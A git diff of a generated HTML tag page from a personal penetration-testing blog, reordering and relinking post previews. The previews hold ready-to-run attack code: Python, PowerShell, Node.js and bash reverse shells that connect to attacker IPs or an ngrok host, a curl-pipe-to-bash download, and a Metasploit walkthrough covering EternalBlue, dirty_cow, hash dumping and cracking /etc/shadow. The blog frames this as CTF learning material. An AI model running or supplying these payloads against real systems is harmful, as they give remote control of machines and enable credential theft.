@@ -173,35 +173,6 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🐍 Python Reverse Shell Cheat Sheet
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>This cheat sheet shows useful Python reverse shell one-liners and a PowerShell reverse shell generator in Python.
-1. Python3 Reverse Shell One-liner python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.9.50.114&#34;,3232));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Connects back to attacker IP 10.9.50.114 on port 3232. Uses socket, duplicates file descriptors for stdin/stdout/stderr. Spawns an interactive /bin/sh shell. Works on most Linux systems with Python 3 installed. 2. Python Script to Generate PowerShell Reverse Shell Command (Base64 Encoded) #!/usr/bin/env python3 import sys import base64 def help(): print(&#34;USAGE: %s IP PORT&#34; % sys.argv[0]) print(&#34;Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT&#34;) exit() try: (ip, port) = (sys.argv[1], int(sys.argv[2])) except: help() payload = &#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;%s&#34;,%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#34;PS &#34; &#43; (pwd).Path &#43; &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39; payload = payload % (ip, port) cmdline = &#34;powershell -e &#34; &#43; base64.b64encode(payload.encode(&#39;utf16&#39;)[2:]).decode() print(cmdline) How to use: Run this script:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🐍 Python Reverse Shell Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/-python-reverse-shell-cheat-sheet/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🐚 JavaScript Reverse Shell &amp; Command Execution Cheat Sheet
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Useful JavaScript snippets for remote command execution, reverse shells, and post-exploitation via Node.js or vulnerable eval() injection.
-📄 Basic Reverse Shell using child_process.exec() require(&#39;child_process&#39;).exec(&#39;nc 0.tcp.in.ngrok.io 18402 -e /bin/sh&#39;) 📌 Listener on attacker side: nc -lvnp 18402 📄 Spawn a shell via spawn() method require(&#39;child_process&#39;).spawn(&#39;/bin/sh&#39;, []) This spawns an interactive shell on the server if injected.
-📄 Execute a simple Linux command require(&#39;child_process&#39;).exec(&#39;ls -la&#39;, function(error, stdout, stderr) { console.log(stdout) }) 📄 Download and execute a script (e.g., reverse shell script) require(&#39;child_process&#39;).exec(&#39;curl http://10.10.14.5/rev.sh | bash&#39;) 📄 Reverse shell using bash and TCP require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1&#39;) 💡 Use this when nc -e is restricted or not available.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🐚 JavaScript Reverse Shell & Command Execution Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/-javascript-reverse-shell--command-execution-cheat-sheet/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
     <h2 class="entry-hint-parent">Basic Reverse Shell Payloads
     </h2>
   </header>
@@ -210,7 +181,7 @@
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to Basic Reverse Shell Payloads" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/bash_command_revshell/"></a>
+  <a class="entry-link" aria-label="post link to Basic Reverse Shell Payloads" href="http://localhost:1313/posts/penetration-testing/webvulnerability/bash_command_revshell/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -225,7 +196,35 @@ Windows x64 Reverse Shell msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to Generating Reverse Shells with Metasploit&#39;s msfvenom." href="http://localhost:1313/posts/tipsandtricks/webvulnerability/metasploit_meterpreter_reverseshell/"></a>
+  <a class="entry-link" aria-label="post link to Generating Reverse Shells with Metasploit&#39;s msfvenom." href="http://localhost:1313/posts/penetration-testing/webvulnerability/metasploit_meterpreter_reverseshell/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">JavaScript Reverse Shell &amp; Command Execution Cheat Sheet
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Useful JavaScript snippets for remote command execution, reverse shells, and post-exploitation via Node.js or vulnerable eval() injection.
+📄 Basic Reverse Shell using child_process.exec() require(&#39;child_process&#39;).exec(&#39;nc 0.tcp.in.ngrok.io 18402 -e /bin/sh&#39;) 📌 Listener on attacker side: nc -lvnp 18402 📄 Spawn a shell via spawn() method require(&#39;child_process&#39;).spawn(&#39;/bin/sh&#39;, []) This spawns an interactive shell on the server if injected.
+📄 Execute a simple Linux command require(&#39;child_process&#39;).exec(&#39;ls -la&#39;, function(error, stdout, stderr) { console.log(stdout) }) 📄 Download and execute a script (e.g., reverse shell script) require(&#39;child_process&#39;).exec(&#39;curl http://10.10.14.5/rev.sh | bash&#39;) 📄 Reverse shell using bash and TCP require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1&#39;) 💡 Use this when nc -e is restricted or not available.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to JavaScript Reverse Shell & Command Execution Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/-javascript-reverse-shell--command-execution-cheat-sheet/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Metasploit Practical Guide (for Beginners and CTF use)
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port &#43; Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts &amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required &#43; optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST &lt;your_ip&gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST &lt;your_ip&gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd &#34;lsadump::sam&#34; Process Migration ps migrate &lt;pid&gt; getpid Privilege Escalation getsystem Or use:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Metasploit Practical Guide (for Beginners and CTF use)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -238,20 +237,21 @@ Windows x64 Reverse Shell msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1
 </p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
-  <a class="entry-link" aria-label="post link to Python (Linux only)" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/python_revshell/"></a>
+  <a class="entry-link" aria-label="post link to Python (Linux only)" href="http://localhost:1313/posts/penetration-testing/webvulnerability/python_revshell/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🧨 Metasploit Practical Guide (for Beginners and CTF use)
+    <h2 class="entry-hint-parent">Python Reverse Shell Cheat Sheet
     </h2>
   </header>
   <div class="entry-content">
-    <p>🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port &#43; Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts &amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required &#43; optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST &lt;your_ip&gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST &lt;your_ip&gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd &#34;lsadump::sam&#34; Process Migration ps migrate &lt;pid&gt; getpid Privilege Escalation getsystem Or use:
+    <p>This cheat sheet shows useful Python reverse shell one-liners and a PowerShell reverse shell generator in Python.
+1. Python3 Reverse Shell One-liner python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.9.50.114&#34;,3232));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Connects back to attacker IP 10.9.50.114 on port 3232. Uses socket, duplicates file descriptors for stdin/stdout/stderr. Spawns an interactive /bin/sh shell. Works on most Linux systems with Python 3 installed. 2. Python Script to Generate PowerShell Reverse Shell Command (Base64 Encoded) #!/usr/bin/env python3 import sys import base64 def help(): print(&#34;USAGE: %s IP PORT&#34; % sys.argv[0]) print(&#34;Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT&#34;) exit() try: (ip, port) = (sys.argv[1], int(sys.argv[2])) except: help() payload = &#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;%s&#34;,%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#34;PS &#34; &#43; (pwd).Path &#43; &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39; payload = payload % (ip, port) cmdline = &#34;powershell -e &#34; &#43; base64.b64encode(payload.encode(&#39;utf16&#39;)[2:]).decode() print(cmdline) How to use: Run this script:
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🧨 Metasploit Practical Guide (for Beginners and CTF use)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"></a>
+  <a class="entry-link" aria-label="post link to Python Reverse Shell Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/-python-reverse-shell-cheat-sheet/"></a>
 </article>
           <div style="margin-top: auto">
             <div class="content-footer">
@@ -281,7 +281,9 @@ Windows x64 Reverse Shell msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
